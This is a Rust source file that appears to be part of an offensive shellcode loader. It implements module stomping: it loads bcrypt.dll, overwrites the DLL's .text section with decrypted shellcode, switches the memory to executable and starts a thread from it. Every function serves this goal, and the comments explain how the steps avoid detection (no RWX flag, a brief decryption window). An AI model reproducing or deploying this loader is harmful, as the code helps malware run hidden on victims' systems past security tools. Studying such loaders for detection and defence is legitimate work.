//! Module stomping engine.
//!
//! Implements the core technique: loads a legitimate Windows DLL, locates its
//! `.text` section via PE parsing, clears it, decrypts shellcode in-place
//! (JIT), flips memory to executable, and spawns a thread from the stomped section.

use std::ffi::c_void;
use windows::core::{s, Result};
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::LibraryLoader::LoadLibraryA;
use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS};
use windows::Win32::System::Threading::{CreateThread, THREAD_CREATION_FLAGS};

use crate::crypto;
use crate::debug_println;
use crate::pe::{self, TextSectionInfo};

const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;

/// Loads the target DLL that will be stomped.
///
/// Uses `bcrypt.dll` — a legitimate Windows system DLL whose `.text` section
/// will be overwritten with shellcode.
fn load_target_dll() -> Result<HMODULE> {
    debug_println!("[+] Loading target DLL: bcrypt.dll");
    unsafe { LoadLibraryA(s!("bcrypt.dll")) }
}

/// Changes memory protection of a region.
///
/// Returns the previous protection flags so they can be referenced if needed.
unsafe fn set_protection(address: *mut c_void, size: usize, prot: u32) -> Result<PAGE_PROTECTION_FLAGS> {
    let mut old = PAGE_PROTECTION_FLAGS(0);
    VirtualProtect(address, size, PAGE_PROTECTION_FLAGS(prot), &mut old)?;
    Ok(old)
}

/// Clears the target `.text` section with zeroes.
///
/// At this point the shellcode is still encrypted in the binary — only the
/// original DLL code is erased.
unsafe fn clear_section(info: &TextSectionInfo) {
    debug_println!("[+] Clearing .text section ({} bytes)", info.size);
    std::ptr::write_bytes(info.base_address as *mut u8, 0, info.size);
}

/// Executes the full module stomping pipeline:
///
/// 1. Load `bcrypt.dll` into process memory
/// 2. Parse PE headers → locate `.text` section
/// 3. Set `.text` to `PAGE_READWRITE` (no execute — avoids RWX flag)
/// 4. Zero the section (original code erased, shellcode still encrypted)
/// 5. JIT-decrypt shellcode directly into the zeroed section
/// 6. Flip to `PAGE_EXECUTE_READ` (normal `.text` permissions)
/// 7. Spawn thread from the stomped section
///
/// The decrypted shellcode exists in memory for <1ms before execution begins.
pub fn run() -> Result<()> {
    // Step 1: Load legitimate DLL
    let dll_handle = load_target_dll()?;
    debug_println!("[+] Module loaded at 0x{:X}", dll_handle.0 as usize);

    // Step 2: Locate .text section via PE parsing
    let text_info = pe::find_text_section(dll_handle)?;

    unsafe {
        // Step 3: Make section writable (RW, not RWX)
        let _old = set_protection(text_info.base_address, text_info.size, PAGE_READWRITE)?;
        debug_println!("[+] .text set to PAGE_READWRITE");

        // Step 4: Clear original code
        clear_section(&text_info);

        // Step 5: JIT decrypt shellcode into the section
        crypto::decrypt_to(text_info.base_address as *mut u8, text_info.size);

        // Step 6: Restore executable permissions (RX)
        set_protection(text_info.base_address, text_info.size, PAGE_EXECUTE_READ)?;
        debug_println!("[+] .text set to PAGE_EXECUTE_READ");

        // Step 7: Execute from stomped section
        debug_println!("[+] Spawning thread at 0x{:X}", text_info.base_address as usize);
        CreateThread(
            None,
            0,
            Some(std::mem::transmute(text_info.base_address)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )?;

        // Allow shellcode to run
        std::thread::sleep(std::time::Duration::from_secs(3));
    }

    debug_println!("[+] Module stomping completed");
    Ok(())
}
